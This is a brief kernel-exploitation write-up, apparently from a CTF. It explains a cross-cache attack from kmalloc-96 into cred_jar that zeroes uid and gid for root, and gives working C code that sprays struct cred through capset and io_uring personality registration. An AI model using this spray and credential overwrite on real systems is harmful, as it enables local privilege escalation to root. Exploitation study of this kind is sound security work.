
Because of leaking kernel base is impossible to me , I didn't use cross cache technique with `kmalloc-192` and `cred_jar` but with `kmalloc-96` and `cred_jar`,
just set uid, gid, suid, ... to `zero` ( don't need to leak many addresses like keyring and namespace struct).

I've learnt a better way to spary `struct cred` :D, better than spaming high number of threads.

```c
static int sys_io_uring_setup(size_t entries, struct io_uring_params *p)
{
    return syscall(__NR_io_uring_setup, entries, p);
}

static int uring_create(size_t n_sqe, size_t n_cqe)
{
    struct io_uring_params p = {
        .cq_entries = n_cqe,
        .flags = IORING_SETUP_CQSIZE};

    int res = sys_io_uring_setup(n_sqe, &p);
    if (res < 0)
        errExit("uring_create::io_uring_setup");
    return res;
}

static int alloc_n_creds(int uring_fd, size_t n_creds)
{
    for (size_t i = 0; i < n_creds; i++)
    {
        struct __user_cap_header_struct cap_hdr = {
            .pid = 0,
            .version = _LINUX_CAPABILITY_VERSION_3};

        struct __user_cap_data_struct cap_data[2] = {0};

        /* allocate new cred */
        if (syscall(SYS_capset, &cap_hdr, (void *)cap_data))
            errExit("alloc_n_creds::capset");

        if (syscall(SYS_io_uring_register, uring_fd, IORING_REGISTER_PERSONALITY, 0, 0) < 0)
            errExit("alloc_n_creds::io_uring_register");
    }
}
```
